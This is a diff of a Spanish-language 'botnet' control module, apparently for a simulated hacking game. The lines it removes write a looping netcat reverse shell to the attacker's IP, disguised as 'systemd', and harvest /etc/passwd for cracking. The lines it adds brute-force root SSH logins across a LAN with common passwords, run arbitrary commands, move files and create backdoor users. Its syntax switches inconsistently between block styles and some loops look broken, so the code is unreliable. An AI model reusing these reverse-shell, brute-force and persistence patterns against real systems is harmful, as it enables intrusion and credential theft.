@@ -1,152 +1,408 @@
 // modulo botnet.nini - El Alma de Revenant
 
 tarea modulo_botnet_menu:
-    opciones = [
-        {"label": "Ver nodos activos", "cmd": "info"},
-        {"label": "Establecer Callback (rshell)", "cmd": "callback"},
-        {"label": "Esperar conexiones", "cmd": "server"},
-        {"label": "Ejecutar comando en nodos", "cmd": "exec"},
-    ]
-    
-    modo = menu_interactivo("CONTROL DE BOTNET", opciones)
-    si not modo: return
-    
-    si modo == "info":
-        modulo_botnet_info()
-    osi modo == "callback":
-        botnet_establecer_callback()
-    osi modo == "server":
-        botnet_esperar_conexiones()
-    osi modo == "exec":
-        botnet_ejecutar_comando()
-
-tarea modulo_botnet_info:
     si enjambre.len == 0:
         error("El enjambre esta vacio. Asalta algum objetivo primero.")
         return
-        
-    info("Desplegando estado del enjambre (" + enjambre.len + " nodos activos):")
-    columnas = ["IP Victima", "Tipo Acceso"]
+    
+    // Mostrar sesiones disponibles
+    info("SESIONES ACTIVAS (" + str(enjambre.len) + "):")
+    
+    nodos = enjambre.indexes
+    columnas = ["#", "IP", "Tipo"]
     filas = []
     
-    para nodo en enjambre:
-        ip_nodo = nodo.key
-        sesion_hash = typeof(nodo.value)
-        filas.push([ip_nodo, sesion_hash])
+    para i en rango(0, nodos.len):
+        ip = nodos[i]
+        sesion = enjambre[ip]
+        tipo = typeof(sesion)
+        filas.push([i + 1, ip, tipo])
+    fin
     
-    tabla = construir_tabla(columnas, filas)
-    print(tabla)
+    print(construir_tabla(columnas, filas))
+    dibujar_separador()
+    
+    // Seleccionar sesion
+    sel = pedir("Selecciona sesion (#) o Enter para volver: ")
+    si sel == "": return
+    
+    idx = val(sel) - 1
+    si idx < 0 o idx >= nodos.len:
+        error("Seleccion invalida.")
+        return
+    
+    ip_seleccionada = nodos[idx]
+    sesion_seleccionada = enjambre[ip_seleccionada]
+    
+    // Menu segun tipo de sesion
+    modulo_sesion_interactuar(ip_seleccionada, sesion_seleccionada)
 
-tarea botnet_establecer_callback:
-    info("CONFIGURANDO CALLBACK EN OBJETIVO...")
+tarea modulo_sesion_interactuar(ip, sesion):
+    tipo = typeof(sesion)
+    info("SESION: " + ip + " (" + tipo + ")")
     
-    objetivo = globals.objetivo_actual
-    si not objetivo:
-        error("No hay objetivo seleccionado.")
-        return
+    opciones = []
     
-    tu_ip = get_shell.host_computer.local_ip
-    info("Tu IP (atacante): " + tu_ip)
-    
-    puerto = pedir("Puerto de callback (Enter=4444): ")
-    si puerto == "":
-        puerto = "4444"
-    
-    proceso = pedir("Nombre del proceso (Enter=systemd): ")
-    si proceso == "":
-        proceso = "systemd"
-    
-    comp = obtener_computadora_objetivo()
-    si not comp:
-        error("No hay sesion activa.")
-        return
-    
-    // Crear script de callback
-    contenido = "#!/bin/bash" + char(10)
-    contenido = contenido + "while true; do nc " + tu_ip + " " + puerto + " -e /bin/sh; sleep 60; done"
-    
-    ruta_script = "/tmp/revenant_callback.sh"
-    archivo = comp.File(ruta_script)
-    si archivo:
-        archivo.set_content(contenido)
-        comp.chmod("+x", ruta_script)
-        exito("Callback configurado en: " + ruta_script)
-        info("Para ejecutar: bash " + ruta_script)
+    si tipo == "shell":
+        opciones = [
+            {"label": "Abrir terminal", "cmd": "terminal"},
+            {"label": "Jump (copiar y ejecutar)", "cmd": "jump"},
+            {"label": "Ver archivos", "cmd": "files"},
+            {"label": "Informacion del sistema", "cmd": "info"},
+            {"label": "Descargar archivo", "cmd": "download"},
+            {"label": "Subir archivo", "cmd": "upload"},
+            {"label": "Ejecutar comando", "cmd": "exec"},
+            {"label": "Scan & Jump automatico", "cmd": "scanjump"},
+        ]
+    osi tipo == "computer":
+        opciones = [
+            {"label": "Ver archivos", "cmd": "files"},
+            {"label": "Informacion del sistema", "cmd": "info"},
+            {"label": "Descargar archivo", "cmd": "download"},
+            {"label": "Subir archivo", "cmd": "upload"},
+            {"label": "Crear usuario", "cmd": "adduser"},
+        ]
+    osi tipo == "file":
+        opciones = [
+            {"label": "Ver contenido", "cmd": "view"},
+            {"label": "Listar directorio", "cmd": "list"},
+            {"label": "Descargar", "cmd": "download"},
+        ]
+    osi tipo == "number" or tipo == "router":
+        opciones = [
+            {"label": "Ver puertos", "cmd": "ports"},
+            {"label": "Ver dispositivos", "cmd": "devices"},
+            {"label": "Informacion del router", "cmd": "info"},
+        ]
     sino:
-        error("No se pudo crear el script.")
-
-tarea botnet_esperar_conexiones:
-    info("ESPERANDO CONEXIONES DE BOTNET...")
-    info("Usa 'nc -lvp <puerto>' para escuchar.")
+        opciones = [
+            {"label": "Ver informacion", "cmd": "info"},
+        ]
     
-    metax = include_lib("/lib/metaxploit.so")
-    si not metax:
-        error("Metaxploit no disponible.")
+    accion = menu_interactivo("ACCIONES", opciones)
+    si not accion: return
+    
+    // Ejecutar accion
+    si accion == "terminal":
+        sesion.start_terminal
+    osi accion == "files":
+        sesion_action_files(ip, sesion)
+    osi accion == "info":
+        sesion_action_info(ip, sesion)
+    osi accion == "download":
+        sesion_action_download(ip, sesion)
+    osi accion == "upload":
+        sesion_action_upload(ip, sesion)
+    osi accion == "exec":
+        sesion_action_exec(ip, sesion)
+    osi accion == "adduser":
+        sesion_action_adduser(ip, sesion)
+    osi accion == "view":
+        sesion_action_view_file(ip, sesion)
+    osi accion == "list":
+        sesion_action_list_dir(ip, sesion)
+    osi accion == "ports":
+        sesion_action_ports(ip, sesion)
+    osi accion == "devices":
+        sesion_action_devices(ip, sesion)
+    osi accion == "jump":
+        sesion_action_jump(ip, sesion)
+    osi accion == "scanjump":
+        sesion_action_scanjump(ip, sesion)
+
+tarea sesion_action_jump(ip, sesion):
+    si typeof(sesion) != "shell" then
+        error("Jump requiere una shell")
         return
     
-    victims = metax.rshell_server
+    info("AUTO-JUMP a " + ip + "...")
     
-    si not victims o victims.len == 0:
-        info("No hay conexiones entrantes.")
+    resultado = jumping_auto(sesion, ip)
+    si resultado then
+        exito("Jump realizado a " + ip)
+    else
+        error("No se pudo realizar el jump")
+
+tarea sesion_action_scanjump(ip, sesion):
+    // Scan & Jump: escanear red local y saltar a todos
+    si typeof(sesion) != "shell" then
+        error("ScanJump requiere una shell")
         return
     
-    info("Conexiones activas: " + str(victims.len))
+    info("SCAN & JUMP desde " + ip + "...")
     
-    para v en victims:
-        info("Nodo conectado: " + typeof(v))
+    comp = sesion.host_computer
+    router = get_router(ip)
+    si no router then
+        error("No se pudo obtener router")
+        return
+    
+    dispositivos = router.devices_lan_ip
+    si dispositivos.len == 0 then
+        info("No hay dispositivos en la red local")
+        return
+    
+    info("Dispositivos encontrados: " + str(dispositivos.len))
+    
+    exitos = 0
+    para target_ip in dispositivos
+        si target_ip == ip then continue
+        si enjambre.hasIndex(target_ip) then continue
+        
+        info("Probando " + target_ip + "...")
+        
+        // Intentar SSH como root con passwords comunes
+        passwords = ["root", "toor", "admin", "123456", "password", ""]
+        para pwd in passwords
+            resultado = get_shell.connect_service(target_ip, 22, "root", pwd)
+            si resultado != null then
+                exito("SSH a " + target_ip + " exitoso!")
+                enjambre[target_ip] = resultado
+                exitos = exitos + 1
+    
+    info("ScanJump completado: " + str(exitos) + " nuevas sesiones")
 
-tarea botnet_ejecutar_comando:
-    si enjambre.len == 0:
-        error("El enjambre esta vacio.")
+tarea sesion_action_files(ip, sesion):
+    comp = null
+    si typeof(sesion) == "shell":
+        comp = sesion.host_computer
+    osi typeof(sesion) == "computer":
+        comp = sesion
+    
+    si not comp:
+        error("No se pudo obtener computadora.")
+        return
+    
+    root = comp.File("/")
+    si not root:
+        error("No se pudo acceder al sistema de archivos.")
+        return
+    
+    info("ARCHIVOS EN " + ip + ":")
+    listar_archivos(root, "")
+
+tarea listar_archivos(archivo, indent):
+    si not archivo: return
+    
+    nombre = archivo.name
+    si nombre == "": nombre = "/"
+    
+    tipo_arch = ""
+    si archivo.is_directory:
+        tipo_arch = "<color=#00e5ff>[DIR]</color>"
+    sino si archivo.is_binary:
+        tipo_arch = "<color=#ffea00>[BIN]</color>"
+    sino:
+        tipo_arch = "<color=#ffffff>[FILE]</color>"
+    
+    permisos = ""
+    si archivo.has_permission("r"): permisos = permisos + "r"
+    si archivo.has_permission("w"): permisos = permisos + "w"
+    si archivo.has_permission("x"): permisos = permisos + "x"
+    
+    print(indent + tipo_arch + " " + nombre + " <color=#424242>(" + permisos + ")</color>")
+    
+    si archivo.is_directory:
+        hijos = archivo.get_files
+        si hijos:
+            para hijo en hijos:
+                listar_archivos(hijo, indent + "  ")
+
+tarea sesion_action_info(ip, sesion):
+    info("INFORMACION DE " + ip + ":")
+    print("  Tipo: " + typeof(sesion))
+    
+    si typeof(sesion) == "shell":
+        comp = sesion.host_computer
+        print("  Usuario: " + sesion.user)
+        print("  Home: " + sesion.current_dir)
+        si comp:
+            print("  IP Local: " + comp.local_ip)
+            print("  IP Publica: " + comp.public_ip)
+            print("  Hostname: " + comp.get_name)
+    osi typeof(sesion) == "computer":
+        print("  IP Local: " + sesion.local_ip)
+        print("  IP Publica: " + sesion.public_ip)
+        print("  Hostname: " + sesion.get_name)
+    osi typeof(sesion) == "file":
+        print("  Ruta: " + sesion.path)
+        print("  Nombre: " + sesion.name)
+
+tarea sesion_action_download(ip, sesion):
+    comp = null
+    si typeof(sesion) == "shell":
+        comp = sesion.host_computer
+    osi typeof(sesion) == "computer":
+        comp = sesion
+    
+    si not comp:
+        error("No se pudo obtener computadora.")
+        return
+    
+    ruta = pedir("Ruta del archivo remoto: ")
+    si ruta == "": return
+    
+    archivo = comp.File(ruta)
+    si not archivo:
+        error("Archivo no encontrado: " + ruta)
+        return
+    
+    si archivo.is_directory:
+        error("No se puede descargar un directorio.")
+        return
+    
+    contenido = archivo.get_content
+    si contenido == null:
+        error("No se pudo leer el archivo.")
+        return
+    
+    nombre_local = archivo.name
+    archivo_local = get_shell.host_computer.File(current_path + "/" + nombre_local)
+    
+    si archivo_local:
+        archivo_local.set_content(contenido)
+    sino:
+        get_shell.host_computer.touch(current_path, nombre_local)
+        archivo_local = get_shell.host_computer.File(current_path + "/" + nombre_local)
+        si archivo_local:
+            archivo_local.set_content(contenido)
+    
+    exito("Descargado: " + nombre_local)
+
+tarea sesion_action_upload(ip, sesion):
+    comp = null
+    si typeof(sesion) == "shell":
+        comp = sesion.host_computer
+    osi typeof(sesion) == "computer":
+        comp = sesion
+    
+    si not comp:
+        error("No se pudo obtener computadora.")
+        return
+    
+    ruta_local = pedir("Ruta del archivo local: ")
+    si ruta_local == "": return
+    
+    archivo_local = get_shell.host_computer.File(ruta_local)
+    si not archivo_local:
+        error("Archivo local no encontrado.")
+        return
+    
+    contenido = archivo_local.get_content
+    ruta_remota = pedir("Ruta remota (Enter=/tmp/): ")
+    si ruta_remota == "": ruta_remota = "/tmp/"
+    
+    nombre = archivo_local.name
+    comp.touch(ruta_remota, nombre)
+    archivo_remoto = comp.File(ruta_remota + nombre)
+    
+    si archivo_remoto:
+        archivo_remoto.set_content(contenido)
+        exito("Subido: " + ruta_remota + nombre)
+    sino:
+        error("No se pudo subir el archivo.")
+
+tarea sesion_action_exec(ip, sesion):
+    si typeof(sesion) != "shell":
+        error("Esta accion requiere una shell.")
         return
     
     comando = pedir("Comando a ejecutar: ")
     si comando == "": return
     
-    info("Ejecutando en " + str(enjambre.len) + " nodos...")
-    
-    para nodo en enjambre:
-        ip_nodo = nodo.key
-        sesion = nodo.value
-        
-        si typeof(sesion) == "shell":
-            sesion.launch("/bin/sh", "-c '" + comando + "'")
-            exito("Ejecutado en " + ip_nodo)
-        sino:
-            error("Sin shell en " + ip_nodo)
+    sesion.launch("/bin/sh", "-c '" + comando + "'")
+    exito("Comando ejecutado.")
 
-tarea modulo_botnet_saquear:
-    si enjambre.len == 0:
-        error("El enjambre esta vacio.")
-        return
-        
-    info("Iniciando extraccion e iteracion masiva de diccionarios...")
+tarea sesion_action_adduser(ip, sesion):
+    comp = null
+    si typeof(sesion) == "shell":
+        comp = sesion.host_computer
+    osi typeof(sesion) == "computer":
+        comp = sesion
     
-    para nodo en enjambre:
-        ip_nodo = nodo.key
-        sesion = nodo.value
-        
-        computer_node = null
-        si typeof(sesion) == "shell":
-            computer_node = sesion.host_computer
-        osi typeof(sesion) == "computer":
-            computer_node = sesion
-            
-        si computer_node:
-            info("Escaneando /etc/passwd en " + ip_nodo)
-            archivo = computer_node.File("/etc/passwd")
-            si archivo and archivo.has_permission("r"):
-                exito("Sombra obtenida. Desplegando algoritmos crypto...")
-                
-                contenido_passwd = archivo.get_content
-                // Usando macro cruda del auto-hacker API Nini
-                crackear_diccionario(contenido_passwd)
-                credenciales = __nini_res_crack
-                
-                si typeof(credenciales) == "map":
-                    para cred en credenciales:
-                        info("> [VULNERADO] Usuario: " + cred.key + " | Pass: " + cred.value)
-                sino:
-                    error("Fallo al inyectar auto-hacker crypto.")
-            sino:
-                error("Proteccion detectada en " + ip_nodo)
+    si not comp:
+        error("No se pudo obtener computadora.")
+        return
+    
+    usuario = pedir("Nuevo usuario: ")
+    si usuario == "": return
+    
+    pass = pedir("Password: ")
+    si pass == "": return
+    
+    resultado = comp.create_user(usuario, pass)
+    si resultado == 1:
+        exito("Usuario creado: " + usuario)
+    sino:
+        error("No se pudo crear el usuario.")
+
+tarea sesion_action_view_file(ip, sesion):
+    si typeof(sesion) != "file":
+        error("Esta accion requiere un archivo.")
+        return
+    
+    contenido = sesion.get_content
+    si contenido == null:
+        error("No se pudo leer el archivo.")
+        return
+    
+    info("CONTENIDO DE " + sesion.path + ":")
+    print(contenido)
+
+tarea sesion_action_list_dir(ip, sesion):
+    si typeof(sesion) != "file" o not sesion.is_directory:
+        error("Esta accion requiere un directorio.")
+        return
+    
+    hijos = sesion.get_files
+    si not hijos or hijos.len == 0:
+        info("Directorio vacio.")
+        return
+    
+    columnas = ["Nombre", "Tipo", "Tamanio"]
+    filas = []
+    
+    para hijo in hijos:
+        tipo = "FILE"
+        si hijo.is_directory: tipo = "DIR"
+        si hijo.is_binary: tipo = "BIN"
+        filas.push([hijo.name, tipo, str(hijo.size)])
+    fin
+    
+    print(construir_tabla(columnas, filas))
+
+tarea sesion_action_ports(ip, sesion):
+    si typeof(sesion) != "number" and typeof(sesion) != "router":
+        error("Esta accion requiere un router.")
+        return
+    
+    puertos = sesion.used_ports
+    si not puertos or puertos.len == 0:
+        info("No hay puertos.")
+        return
+    
+    columnas = ["Puerto", "Estado", "Servicio", "IP LAN"]
+    filas = []
+    
+    para port in puertos:
+        estado = "closed"
+        si not port.is_closed: estado = "open"
+        filas.push([port.port_number, estado, sesion.port_info(port), port.get_lan_ip])
+    fin
+    
+    print(construir_tabla(columnas, filas))
+
+tarea sesion_action_devices(ip, sesion):
+    si typeof(sesion) != "number" and typeof(sesion) != "router":
+        error("Esta accion requiere un router.")
+        return
+    
+    devices = sesion.devices
+    si not devices or devices.len == 0:
+        info("No hay dispositivos.")
+        return
+    
+    info("DISPOSITIVOS:")
+    para dev in devices:
+        print("  - " + dev)
+    fin
